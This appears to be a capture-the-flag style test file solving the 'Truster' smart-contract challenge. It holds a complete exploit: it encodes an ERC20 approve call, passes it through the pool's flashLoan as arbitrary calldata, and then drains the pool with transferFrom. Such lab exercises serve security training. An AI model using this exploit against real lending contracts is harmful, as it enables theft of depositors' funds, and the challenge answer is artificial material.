```js
// test/truster/truster.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        let abi = ["function approve(address to, uint256 amount)"];

        let iface = new ethers.utils.Interface(abi);

        const data = iface.encodeFunctionData("approve", [
        player.address,
        TOKENS_IN_POOL,
        ]);

        await pool.flashLoan(0, player.address, token.address, data);
        
        await token
        .connect(player)
        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);

    });
```
